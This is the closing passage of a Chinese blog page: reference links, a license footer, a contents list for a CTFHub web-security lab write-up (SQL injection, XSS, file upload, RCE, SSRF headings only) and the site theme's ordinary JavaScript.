<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_48799157/article/details/123934857?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170323401816800180636035%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170323401816800180636035&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123934857-null-null.142%5Ev96%5Epc_search_result_base9&amp;utm_term=CTFhub%20post%E8%AF%B7%E6%B1%82&amp;spm=1018.2226.3001.4187">CTFHub技能树笔记之SSRF：POST请求、文件上传</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Bossfrank/article/details/130431117?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170323334516800226564567%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170323334516800226564567&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-130431117-null-null.142%5Ev96%5Epc_search_result_base9&amp;utm_term=CTFhub%20%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F&amp;spm=1018.2226.3001.4187">SSRF详解 基于CTFHub（上篇）</a></p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/12/14/pentesterlab-xi-lie/">PentesterLab刷题记录</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/12/09/java-fan-xu-lie-hua-1/">Java反序列化1入门</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-web"><span class="toc-text">0x00 Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD"><span class="toc-text">Web前置技能</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#http%E5%8D%8F%E8%AE%AE-%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F"><span class="toc-text">HTTP协议-请求方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http%E5%8D%8F%E8%AE%AE-302%E8%B7%B3%E8%BD%AC"><span class="toc-text">HTTP协议-302跳转</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http%E5%8D%8F%E8%AE%AE-cookie"><span class="toc-text">HTTP协议-Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http%E5%8D%8F%E8%AE%AE-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81"><span class="toc-text">HTTP协议-基础认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http-%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-text">HTTP-响应包源代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">目录遍历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpinfo"><span class="toc-text">PHPINFO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-text">备份文件下载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81"><span class="toc-text">网站源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bak%E6%96%87%E4%BB%B6"><span class="toc-text">bak文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vim%E7%BC%93%E5%AD%98"><span class="toc-text">vim缓存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ds_store"><span class="toc-text">.DS_Store</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#git%E6%B3%84%E9%9C%B2"><span class="toc-text">Git泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#git-log"><span class="toc-text">Git-Log</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80"><span class="toc-text">解法一：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C"><span class="toc-text">解法二：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#git-stash"><span class="toc-text">Git-Stash</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80"><span class="toc-text">解法一：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C"><span class="toc-text">解法二：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#git-index"><span class="toc-text">Git-Index</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#svn%E6%B3%84%E9%9C%B2"><span class="toc-text">SVN泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hg%E6%B3%84%E9%9C%B2"><span class="toc-text">HG泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4"><span class="toc-text">密码口令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-text">弱口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4"><span class="toc-text">默认口令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">整数型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E7%BB%93%E6%9E%84"><span class="toc-text">MySQL结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie%E6%B3%A8%E5%85%A5"><span class="toc-text">Cookie注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ua%E6%B3%A8%E5%85%A5"><span class="toc-text">UA注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#referer%E6%B3%A8%E5%85%A5"><span class="toc-text">Referer注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-text">过滤空格</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss"><span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-text">XSS-反射型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-text">XSS-存储型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-dom%E5%8F%8D%E5%B0%84"><span class="toc-text">XSS-DOM反射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-dom%E8%B7%B3%E8%BD%AC"><span class="toc-text">XSS-DOM跳转</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-text">XSS-过滤空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="toc-text">XSS-过滤关键词</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E9%AA%8C%E8%AF%81"><span class="toc-text">无验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81"><span class="toc-text">前端验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess"><span class="toc-text">.htaccess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mime%E7%BB%95%E8%BF%87"><span class="toc-text">MIME绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5"><span class="toc-text">文件头检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD"><span class="toc-text">00截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80"><span class="toc-text">双写后缀</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce"><span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eval%E6%89%A7%E8%A1%8C"><span class="toc-text">eval()执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpinput"><span class="toc-text">php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB"><span class="toc-text">远程包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-text">读取源代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4cat"><span class="toc-text">过滤cat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-text">过滤目录分隔符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-text">过滤运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A4%E7%BB%83%E4%B9%A0"><span class="toc-text">综合过滤练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf"><span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="toc-text">内网访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-text">伪协议读取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post%E8%AF%B7%E6%B1%82"><span class="toc-text">POST请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-text">上传文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastcgi%E5%8D%8F%E8%AE%AE"><span class="toc-text">FastCGI协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#url-bypass"><span class="toc-text">URL Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97ip-bypass"><span class="toc-text">数字IP Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#302%E8%B7%B3%E8%BD%AC-bypass"><span class="toc-text">302跳转 Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dns%E9%87%8D%E7%BB%91%E5%AE%9A-bypass"><span class="toc-text">DNS重绑定 Bypass</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">0x03 参考文章</span></a></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
